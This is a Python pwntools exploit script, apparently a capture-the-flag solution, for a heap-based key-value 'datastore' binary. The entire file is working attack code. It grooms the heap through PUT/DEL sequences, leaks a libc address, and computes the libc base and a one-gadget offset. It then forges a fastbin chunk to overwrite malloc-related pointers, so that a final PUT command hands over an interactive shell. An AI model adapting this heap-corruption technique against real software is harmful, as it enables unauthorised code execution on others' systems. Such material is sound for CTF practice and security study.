from pwn import *
 
DEBUG = int(sys.argv[1])
 
if(DEBUG == 0):
    r = remote("1.2.3.4", 23333);
elif(DEBUG == 1):
    r = process("./datastore_7e64104f876f0aa3f8330a409d9b9924.elf");
elif(DEBUG == 2):
    r = process("./datastore_7e64104f876f0aa3f8330a409d9b9924.elf");
    # gdb.attach(r, '''source ./script.py''');
    # gdb.attach(r);
print(str(r.proc.pid))

def put(key, size, data):
    r.recvuntil("Enter command:");
    r.sendline("PUT");
    r.recvuntil("Enter row key:");
    r.sendline(key);
    r.recvuntil("Enter data size:");
    r.sendline(str(size));
    r.recvuntil("Enter data:");
    r.send(data);
 
def get(key):
    r.recvuntil("Enter command:");
    r.sendline("GET");
    r.recvuntil("Enter row key:");
    r.sendline(key);
 
 
def dump():
    r.recvuntil("Enter command:");
    r.sendline("DUMP");
 
def delete(key):
    r.recvuntil("Enter command:");
    r.sendline("DEL");
    r.recvuntil("Enter row key:");
    r.sendline(key);
 
 
def exploit():
    put("A"*0x10, 0x58, "a"*0x58);
    put("B"*0x10, 0x58, "b"*0x58);
    put("C"*0x10, 0x58, "c"*0x58);
    put("D"*0x10, 0x58, "d"*0x58);
    put("E"*0x10, 0x2a8, "e"*0x1f0 + p64(0x200) + p64(0xb0) + "e"*0xa8);
 
    delete("A"*0x10);
    delete("B"*0x10);
    delete("C"*0x10);
    delete("D"*0x10);
    #delete("E"*0x10);
 
    get("X"*0x80);
 
 
    put("F"*0x10, 0x320, 'f'*0x320);
    put("G"*0x10, 0x38, "g"*0x38);
    put("H"*0x10, 0x38, "h"*0x38);
    put("I"*0x10, 0x38, "i"*0x38);
    put("J"*0x10, 0x58, "j"*0x58);
    put("P"*0x10, 0x38, "p"*0x38);
 
    delete("J"*0x10);
    delete("I"*0x10);
    delete("H"*0x10);
    delete("G"*0x10);
    delete("E"*0x10);
 
 
    put("K"*0x10, 0x58, "k"*0x58);
 
    get("X"*0x18);
 
    put("", 0x98, "l"*0x98);
    put("M"*0x10, 0x68, "m"*0x68);
 
    delete("");
 
    put("N"*0x10, 0xe8, "n"*0xe8);
 
    delete("F"*0x10);
 
    put("O"*0x10, 0xc8, "o"*0x98 + p64(0x71) + "o"*0x28);
 
    get("M"*0x10);
    #halt();
 
    r.recvuntil("o"*0x28);
    r.recv(8);
    leaked = r.recv(8);
    leakedValue = u64(leaked);
    log.info("Leaked value: 0x%x" % leakedValue);
    # libcBaseAddr = leakedValue - 0x3be7b8;
    libcBaseAddr = leakedValue - 0x3c4b78;
    log.info("Libc base address: 0x%x" % libcBaseAddr);
    pause()
    delete("M"*0x10);
    delete("O"*0x10);
 
    fakeFastAddr = libcBaseAddr + 0x3be70d;
 
    fakeMallocPtr = libcBaseAddr + 0x82f04;

    # oneGadgetAddr = libcBaseAddr + 0x4652c;
    oneGadgetAddr = libcBaseAddr + 0x4526a;
 
    put("O"*0x10, 0xc8, "o"*0x98 + p64(0x71) + p64(fakeFastAddr) + "o"*0x20);
 
    put("fake1", 0x68, "1"*0x68);
 
    put("fake2", 0x68, "A"*0x13 + p64(oneGadgetAddr) + "A"*8 + p64(fakeMallocPtr) + "A"*0x3d);
     
    r.recvuntil("Enter command:");
    r.sendline("PUT");
 
    r.interactive();
     
exploit();